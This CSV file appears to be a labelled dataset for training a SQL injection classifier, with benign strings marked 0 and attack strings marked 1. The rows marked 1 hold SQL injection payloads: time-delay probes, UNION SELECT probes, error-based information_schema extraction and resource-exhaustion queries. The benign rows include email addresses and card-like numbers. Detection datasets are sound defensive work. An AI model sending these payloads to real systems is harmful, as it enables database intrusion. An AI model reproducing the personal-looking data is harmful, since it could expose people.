Query,Label
1' )  as mara where 7164 = 7164,1
1%'  )  )   waitfor delay '0:0:5'--,1
"c/jon peuelas, 117,",0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )",1
"-3393""   )    )    union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",1
pblica,0
menna4,0
"1""   )    )    as ufba where 4049  =  4049",1
SELECT effort ( s )  FROM congress SELECT doll FROM say,0
canela,0
19416147f,0
1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'rozr' like 'rozr,1
"1"" where 4597  =  4597 rlike sleep  (  5  )  --",1
"1 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )",1
7012769883161832,0
bl!teo,0
British scientists said results interesting warned far research needed,0
vznar,0
"-9509 )  union all select 1193,1193,1193#",1
"In book , interior decorator presents 17 housing models independent living old age",0
ch9let_a,0
49626,0
"SELECT lipsID AS ID, area AS pattern FROM way",0
1902,0
SELECT * FROM party WHERE announced BETWEEN 'trail' AND 'forest',0
SELECT * FROM occasionally 3,0
arditi-alexis@capitalinvest.vc,0
-2214' )  union all select 8228#,1
"Children taught myths legends &quot; models way life &quot; , author says",0
11140,0
-2361'  )  )   as mzhv where 2905 = 2905 or 9026 = 5388--,1
pierre,0
SELECT accident ( s )  FROM dull,0
"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'cdaq' like 'cdaq",1
1'  )   where 4003  =  4003,1
SELECT AVG ( Price ) FROM lucky,0
62381470l,0
SELECT * FROM blind WHERE order NOT LIKE 'century%',0
"-7395%"" order by 1--",1
heintje0@alpesfranceses.com.ro,0
SELECT TOP 50 PERCENT * FROM ear SELECT * FROM fog FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM tribe,0
dalal,0
monforte del cid,0
"SELECT modern,decide,dirt,easily,safety     (  (  frame JOIN acres ON crew.won =  bean.alike )   INNER JOIN ranON Orders.moon =  pot.columnID )",0
sollana,0
5349290000000000,0
enco,0
SELECT * FROM watch FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM remember,0
41950,0
"paratge lila 30, 10?c",0
simeon,0
1 )  where 1527 = 1527 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
SELECT * FROM evidence ORDER BY train DESC,0
ansorger,0
-1765'  )   order by 1--,1
SELECT option_value FROM wp_options WHERE option_name  =  'zcf_captcha_settings' LIMIT 1,0
8259767534834623,0
7o14c0o,0
"cami sant cugat al papiol 59,",0
a' or 1 = 1--,1
"1%' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
FROM  ( SELECT DISTINCT ran FROM outline ),0
hine7,0
8516,0
celeste_bryon@skullride.ki,0
